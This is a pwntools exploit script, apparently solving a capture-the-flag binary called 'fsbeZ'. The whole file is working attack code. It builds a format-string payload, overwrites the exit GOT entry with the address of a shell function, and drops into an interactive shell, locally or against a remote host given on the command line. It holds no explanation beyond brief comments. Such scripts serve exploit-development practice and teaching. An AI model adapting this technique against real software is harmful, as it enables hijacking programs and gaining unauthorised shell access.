from pwn import *
from pwnlib.fmtstr import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './fsbeZ'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'warning'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

offset = 7

info('Format string offset %#x', offset)

shell = p32(0x80491e6)
info('Address to overwrite (elf.got.exit): %#x', elf.got.exit)
info('Address to write func() shell: %#x', shell)

# format_string.write(elf.got.exit, shell)
# format_string.execute_writes()
payload = fmtstr_payload(offset, {elf.got.exit: shell})

io.sendline(payload)
io.interactive()
